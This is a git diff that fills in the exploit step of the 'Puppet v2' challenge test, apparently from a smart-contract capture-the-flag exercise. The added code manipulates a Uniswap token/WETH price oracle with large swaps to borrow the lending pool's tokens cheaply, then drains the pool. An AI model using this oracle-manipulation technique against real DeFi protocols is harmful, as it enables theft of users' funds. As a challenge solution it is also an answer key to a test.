@@ -82,6 +82,41 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        uniswapRouter = this.uniswapRouter.connect(attacker);
+        token = this.token.connect(attacker);
+        weth = this.weth.connect(attacker);
+        lendingPool = this.lendingPool.connect(attacker);
+
+        await token.approve(
+            this.uniswapRouter.address,
+            ATTACKER_INITIAL_TOKEN_BALANCE
+        );
+        timestamp = (await ethers.provider.getBlock('latest')).timestamp * 2
+        path = [this.token.address, this.weth.address];
+        await uniswapRouter.swapExactTokensForTokens(ethers.utils.parseEther('9900'), ethers.utils.parseEther('9.8'), path, attacker.address,
+            timestamp);
+
+        r = await lendingPool.calculateDepositOfWETHRequired(ethers.utils.parseEther('100000'));
+        await weth.approve(lendingPool.address, r);
+        await lendingPool.borrow(ethers.utils.parseEther('100000'));
+
+        await token.approve(
+            this.uniswapRouter.address,
+            ethers.utils.parseEther('99000')
+        );
+        await uniswapRouter.swapExactTokensForTokens(ethers.utils.parseEther('99000'), 0, path, attacker.address, timestamp);
+
+        r2 = await lendingPool.calculateDepositOfWETHRequired(await token.balanceOf(lendingPool.address));
+        await weth.approve(lendingPool.address, r2);
+        await lendingPool.borrow(await token.balanceOf(lendingPool.address));
+
+        await weth.approve(uniswapRouter.address, await weth.balanceOf(attacker.address));
+        await uniswapRouter.swapExactTokensForTokens(await weth.balanceOf(attacker.address), 0, [this.weth.address, this.token.address],
+            attacker.address, timestamp);
+
+        console.log(await ethers.utils.formatEther(await token.balanceOf(attacker.address)));
+        console.log(await ethers.utils.formatEther(await weth.balanceOf(attacker.address)));
+        console.log(await ethers.utils.formatEther(await ethers.provider.getBalance(attacker.address)));
     });
 
     after(async function () {
